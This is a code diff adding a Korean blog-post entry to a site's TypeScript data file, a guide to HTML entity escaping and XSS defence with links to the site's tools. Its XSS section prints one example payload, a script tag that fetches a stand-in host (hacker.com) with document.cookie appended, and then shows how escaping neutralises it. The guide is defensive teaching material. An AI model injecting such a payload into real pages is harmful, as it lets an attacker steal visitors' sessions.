@@ -2446,4 +2446,96 @@ Base64는 3바이트를 4바이트로 늘려 표현하므로, **인코딩 후 �
     aeoQuestion: "Base64 인코딩을 수행하면 왜 파일 용량이 약 33% 증가하나요?",
     aeoAnswer: "Base64는 8비트(1바이트) 3개(총 24비트)를 6비트 단위 4개로 쪼개어 ASCII 문자로 표현하기 때문입니다. 3바이트의 원본 데이터가 4바이트의 텍스트로 변환되므로 정확히 4/3, 즉 약 33.3%의 용량 증가가 발생합니다.",
   },
+  {
+    slug: "html-entity-encode-decode-guide",
+    title: "HTML 엔티티(Entity) 변환 완벽 가이드: 특수문자 이스케이프와 웹 보안(XSS) 방어",
+    description: "HTML에서 꺾쇠 괄호(<, >), 따옴표, 앰퍼샌드(&) 등의 특수문자가 태그로 오인되지 않도록 변환하는 HTML 엔티티(&amp;, &lt;, &gt;)의 원리와 XSS 보안 취약점 방어법, 온라인 변환기 활용 가이드를 정리합니다.",
+    excerpt: "웹 퍼블리셔와 프론트엔드 개발자를 위한 HTML 엔티티 이스케이프 가이드. 예약 문자 치환 규칙, 네임드 엔티티 vs 16진수 유니코드, 그리고 보안 취약점(XSS) 방어 실전.",
+    content: `# HTML 엔티티(Entity) 변환 완벽 가이드: 특수문자 이스케이프와 웹 보안(XSS) 방어
+
+웹 페이지에 코드 예제를 보여주거나 수학 공식(예: A < B), 저작권 기호(©)를 작성할 때, 본문에 입력한 내용이 브라우저에서 화면에 표시되지 않고 사라지거나 레이아웃이 완전히 깨지는 현상을 한 번쯤 경험해 보셨을 것입니다.
+
+이는 웹 브라우저 엔진이 꺾쇠 괄호('<, >')나 앰퍼샌드('&') 같은 기호를 순수한 텍스트가 아닌 **HTML 문법의 시작과 끝을 알리는 '예약된 태그 명령어'**로 해석하기 때문입니다.
+
+이러한 파싱 충돌을 방지하고 문자를 안전하게 화면에 렌더링하기 위해 고안된 표준 규격이 바로 **HTML 엔티티(HTML Entity)**입니다. 나아가 엔티티 변환은 악의적인 스크립트 삽입 공격(XSS)을 차단하는 웹 애플리케이션 보안의 가장 기본적이면서도 강력한 방어선입니다.
+
+이 가이드에서는 반드시 알아야 할 5대 핵심 예약 문자 치환표와 네임드 엔티티의 원리, 그리고 웹 보안 실무 적용법을 상세히 정리합니다.
+
+---
+
+## 1. 반드시 변환해야 하는 5대 핵심 HTML 예약 문자
+
+HTML 표준 규격(W3C/WHATWG)에서 가장 엄격하게 관리하는 5가지 예약 문자는 다음과 같습니다:
+
+| 원본 문자 | 의미 | Named 엔티티 | 10진수 엔티티 | 16진수 엔티티 | 필수 사용 상황 |
+| :---: | :---: | :---: | :---: | :---: | :--- |
+| **'&'** | Ampersand | '&amp;' | '&#38;' | '&#x26;' | 엔티티의 시작 기호로 모든 텍스트에서 치환 필수 |
+| **'<'** | Less Than | '&lt;' | '&#60;' | '&#x3C;' | 태그 시작 기호와 충돌 방지 |
+| **'>'** | Greater Than | '&gt;' | '&#62;' | '&#x3E;' | 태그 닫힘 기호와 충돌 방지 |
+| **'"'** | Double Quote | '&quot;' | '&#34;' | '&#x22;' | HTML 속성값('class=""') 내부 따옴표 깨짐 방지 |
+| **'''** | Single Quote | '&apos;' | '&#39;' | '&#x27;' | 자바스크립트 및 속성값 작은따옴표 깨짐 방지 |
+
+예를 들어 화면에 '<b>텍스트</b>'라는 글자를 태그 효과 없이 그대로 출력하고 싶다면, 소스코드에는 '&lt;b&gt;텍스트&lt;/b&gt;' 형태로 작성해야 브라우저가 볼드체로 만들지 않고 글자 그대로 보여줍니다.
+
+---
+
+## 2. 네임드 엔티티(Named) vs 유니코드 숫자 엔티티
+
+HTML 엔티티는 표기 방식에 따라 2가지로 나뉩니다:
+
+1. **문자명 참조 (Named Entity)**:
+   - 사람이 기억하기 쉬운 영문 단어로 구성됩니다:
+     - '&nbsp;': Non-Breaking Space (줄바꿈 없는 공백)
+     - '&copy;': © (저작권 기호 Copyright)
+     - '&reg;': ® (등록상표 Registered)
+     - '&trade;': ™ (상표 Trademark)
+2. **숫자 코드 참조 (Numeric Entity)**:
+   - 유니코드 코드포인트를 직접 지정하는 방식입니다:
+     - 10진수: '&#코드번호;' (예: '&#169;' -> ©)
+     - 16진수: '&#x코드번호;' (예: '&#x00A9;' -> ©)
+   - 네임드가 지원되지 않는 희귀한 고대 언어나 특수 기호도 유니코드 숫자 엔티티를 사용하면 모든 브라우저에서 100% 호환됩니다.
+
+---
+
+## 3. 웹 보안의 핵심: XSS(Cross-Site Scripting) 방어
+
+게시판 댓글이나 검색창에 악의적인 공격자가 다음과 같은 스크립트를 입력했다고 가정해 봅시다:
+'<script>fetch('https://hacker.com/steal?cookie=' + document.cookie)</script>'
+
+만약 웹 서버가 이 입력을 아무런 검증 없이 데이터베이스에 저장하고 다른 사용자 화면에 그대로 출력한다면, 무고한 방문자가 페이지를 열람하는 즉시 공격자의 악성 자바스크립트가 실행되어 로그인 세션과 개인정보가 탈취됩니다.
+
+**HTML 엔티티 이스케이프(HTML Escaping)**를 적용하면 이 스크립트는 다음과 같이 변환됩니다:
+'&lt;script&gt;fetch(...)&lt;/script&gt;'
+
+브라우저는 이를 실행 가능한 코드가 아니라 단순한 '문자열'로 인식하므로 스크립트 실행이 원천적으로 차단되어 안전한 서비스 환경을 구축할 수 있습니다.
+
+---
+
+## 4. 텍스터브 도구로 HTML 및 특수문자 완벽 정제하기
+
+1. [HTML 태그 제거기](/tools/html-tag-remover)를 활용하여 웹 크롤링이나 복사된 원고에서 불필요한 태그를 1초 만에 깔끔하게 제거하세요.
+2. [URL 인코더/디코더](/tools/url-encoder)로 URL 쿼리 파라미터에 포함된 한글과 특수문자를 안전하게 변환하세요.
+3. [글자수 세기](/tools/char-counter) 도구를 통해 엔티티 치환 전후의 글자수와 바이트(Byte) 용량 변화를 정밀하게 점검해 보세요!
+`,
+    publishedAt: "2026-11-18T09:00:00+09:00",
+    metaTitle: "HTML 엔티티(Entity) 변환 가이드: 특수문자 이스케이프 | Texturb",
+    metaDescription: "HTML 특수문자 이스케이프 원리와 5대 예약 문자 변환표(&amp;, &lt;, &gt;), XSS 보안 취약점 방어법 및 온라인 변환기 활용법을 확인하세요.",
+    targetKeywords: ["HTML 엔티티", "HTML 이스케이프", "HTML 특수문자", "HTML 디코딩", "XSS 방어"],
+    category: "개발자 도구·웹 기술",
+    tags: ["HTML 엔티티", "특수문자", "웹 보안", "XSS", "이스케이프"],
+    author: "Texturb editor",
+    cta: { text: "Texturb 웹 도구 모음 살펴보기", link: "/tools" },
+    inlinks: [
+      { text: "HTML 태그 제거기", link: "/tools/html-tag-remover" },
+      { text: "URL 인코더/디코더", link: "/tools/url-encoder" },
+      { text: "글자수 세기 도구", link: "/tools/char-counter" },
+    ],
+    outlinks: [
+      { text: "W3C HTML Named Character References", link: "https://html.spec.whatwg.org/multipage/named-characters.html", description: "WHATWG 공식 HTML 네임드 엔티티 전체 규격 명세" },
+      { text: "OWASP XSS Prevention Cheat Sheet", link: "https://cheatsheetseries.owasp.org", description: "OWASP 공식 크로스 사이트 스크립팅 방어 가이드" },
+    ],
+    canonicalUrl: "https://texturb.com/blog/html-entity-encode-decode-guide",
+    aeoQuestion: "HTML 엔티티(Entity)를 사용하지 않고 사용자 입력을 그대로 화면에 출력하면 어떤 보안 문제가 발생하나요?",
+    aeoAnswer: "사용자가 입력한 꺾쇠 괄호(<, >)가 브라우저 파서에 의해 실제 HTML 및 자바스크립트 태그(<script>)로 해석되어 실행되는 크로스 사이트 스크립팅(XSS) 취약점이 발생합니다. 이를 방어하려면 반드시 특수문자를 &lt;, &gt; 등의 HTML 엔티티로 이스케이프해야 합니다.",
+  },
 ];
